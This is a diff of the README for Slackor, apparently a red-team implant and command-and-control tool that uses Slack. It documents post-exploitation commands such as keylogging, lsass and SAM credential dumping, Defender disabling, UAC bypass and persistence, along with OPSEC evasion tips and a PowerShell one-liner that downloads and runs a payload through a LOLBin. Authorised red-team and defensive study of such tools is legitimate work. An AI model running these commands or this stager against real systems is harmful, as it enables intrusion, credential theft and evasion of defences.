@@ -25,27 +25,35 @@ For this to work you need:
 - Create a bot
 
 This repo contains five files:
-- ```install.sh``` Installs dependancies
-- ```setup.py``` The script to create the slack channels, database, and implant
-- ```server.py``` The Slackor server, designed to be ran on Linux
-- ```agent.go``` The generated implant
-- ```requirements.txt``` Python dependencies (installed automatically)
+- `install.sh` Installs dependancies
+- `setup.py` The script to create the slack channels, database, and implant
+- `agent.py` Script to generate new implants
+- `server.py` The Slackor server, designed to be ran on Linux
+- `agent.go` The golang implant
+- `requirements.txt` Python dependencies (installed automatically)
 
 To get started:
 
- - Run ```install.sh```
- - Run ```setup.py```
+- `go get github.com/Coalfire-Research/Slackor`
+- `cd $GOPATH/src/github.com/Coalfire-Research/Slackor`
+- Run `install.sh`
+- Run `setup.py`
     - Supply the *OAuth Access Token* and *Bot User OAuth Access Token* from your app
 
-After running the script successfully, a file ```agent.exe``` will be created.  It will be a 64bit Go binary packed with UPX.
+After running the script successfully, several files will be created in the `dist/` directory:
+- `agent.windows.exe`: Windows 64-bit binary
+- `agent.upx.exe`: Windows 64-bit binary, UPX packed
+- `agent.darwin`: macOS 64-bit binary
+- `agent.32.linux`: Linux 32-bit binary
+- `agent.64.linux`: Linux 64-bit binary 
 
-After starting server.py on a Linux host, execute ```agent.exe``` on your target Windows host.
+After starting `server.py` on a Linux host, execute whichever agent above is appropriate for your target host.
 
 Run the "stager" module to generate a one-liner and other droppers.
- ```
- powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
- ```
- This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   
+```
+powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
+```
+This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   
 
 Usage 
 =====
@@ -53,7 +61,7 @@ Type "help" or press [TAB] to see a list of available commands.  type "help [COM
 
 ```(Slackor)```
 
-- **Help** - Displays help menu
+- **help** - Displays help menu
 - **interact** - Interact with an agent
 - **list** - List all registered agents
 - **remove** - kill and remove an agent
@@ -67,36 +75,40 @@ Use "interact [AGENT] to enter into an agent prompt.  Type "help" or press [TAB]
 
 ```(Slackor:AGENT)```
 
-- **back** - Return to the main menu
-- **beacon** - change the amount of time between each check-in by an agent (default is 5 seconds)
-- **bypassuac** - Attempts to spawn a high integrity agent
-- **cleanup** - Removes persistence artifacts
-- **clipboard** - Retreives the contents of the clipboard
-- **defanger** - Attempts to de-fang Windows Defender
-- **download** - Download a file from the agent to the Slackor server
-- **duplicate** - Causes the agent to spawn another invocation of itself
-- **getsystem** - Spawns an agent as NTAUTHORITY/SYSTEM
-- **help** - Displays help menu
-- **keyscan** - Starts a keylogger on the agent
-- **kill** - Kill the agent 
-- **minidump** - Dumps memory from lsass.exe and downloads it  
-- **persist** - Creates persistence by implanting a binary in an ADS
-- **samdump** - Attempts to dump the SAM file for offline hash extraction
-- **screenshot** - Takes a screenshot of the desktop and retrieves it
-- **shellcode** - Executes x64 raw shellcode
-- **sleep** - Cause the agent to sleep once (enter time in seconds)
-- **sysinfo** - Displays the current user, OS version, system architecture, and number of CPU cores
-- **upload** - Upload a file to the agent from the Slackor server
-- **wget** - Pull down arbitrary files over HTTP/HTTPS 
-
+- Common Commands
+    - **back** - Return to the main menu
+    - **beacon** - change the amount of time between each check-in by an agent (default is 5 seconds)
+    - **download** - Download a file from the agent to the Slackor server
+    - **help** - Displays help menu
+    - **kill** - Kill the agent 
+    - **sleep** - Cause the agent to sleep once (enter time in seconds)
+    - **sysinfo** - Displays the current user, OS version, system architecture, and number of CPU cores
+    - **upload** - Upload a file to the agent from the Slackor server
+    - **wget** - Pull down arbitrary files over HTTP/HTTPS 
+- Windows Commands
+    - **bypassuac** - Attempts to spawn a high integrity agent
+    - **cleanup** - Removes persistence artifacts
+    - **clipboard** - Retreives the contents of the clipboard
+    - **defanger** - Attempts to de-fang Windows Defender
+    - **duplicate** - Causes the agent to spawn another invocation of itself
+    - **getsystem** - Spawns an agent as NTAUTHORITY/SYSTEM
+    - **keyscan** - Starts a keylogger on the agent
+    - **minidump** - Dumps memory from lsass.exe and downloads it  
+    - **persist** - Creates persistence by implanting a binary in an ADS
+    - **samdump** - Attempts to dump the SAM file for offline hash extraction
+    - **screenshot** - Takes a screenshot of the desktop and retrieves it
+    - **shellcode** - Executes x64 raw shellcode
+- Mac Commands
+- Linux Commands
+    - **screenshot** - Takes a screenshot of the desktop and retrieves it
 
 #### OPSEC Considerations
 
-Command output and downloaded files are AES encrypted in addition to TLS transport encryption.
+Command output and downloaded files are AES encrypted in addition to Slack's TLS transport encryption.
  
 Modules will warn you before performing tasks that write to disk.  
-When executing shell commands, take note that cmd.exe will be executed.  This may be monitored on the host.
-Here are several OPSEC safe commands that will NOT execute cmd.exe:
+When executing shell commands, take note that `cmd.exe`/`bash` will be executed.  This may be monitored on the host.
+Here are several OPSEC safe commands that will NOT execute `cmd.exe`/`bash`:
 
 - **cat** - prints file content
 - **cd** - change directory
@@ -160,7 +172,10 @@ mimikatz # sekurlsa::logonPasswords
 ```
 **Is it cross-platform?** 
 
-Not yet. It has not been fully tested on a variety of systems.  The server was designed to run on Kali Linux and the agent on Windows 10.  
+It has limited cross-platform support. It has not been fully tested on all of the systems it can be run on.
+The server was designed to run on Kali Linux. The agent is compiled for Windows, Mac, and Linux, but has
+primarily been tested with Windows 10. Agents may mishandle commands which are not supported by that agent's
+platform (don't try to minidump a Mac).
 
 **How well does it scale?** 
 
@@ -176,4 +191,4 @@ I tried my best.  PRs are encouraged :)
 
 **It gets caught by AV!**
 
-The built-in HTA stager is created by [SpookFlare](https://github.com/hlldz/SpookFlare) which is based on [Demiguise](https://github.com/nccgroup/demiguise).  If you want your droppers to not get snagged you probably want to go custom.  The built in droppers are just there to get you started. 
+With this being open source now, it's bound to have issues.  I'll fix modules as I can but there is no guarantee this will bypass all AV at all times.
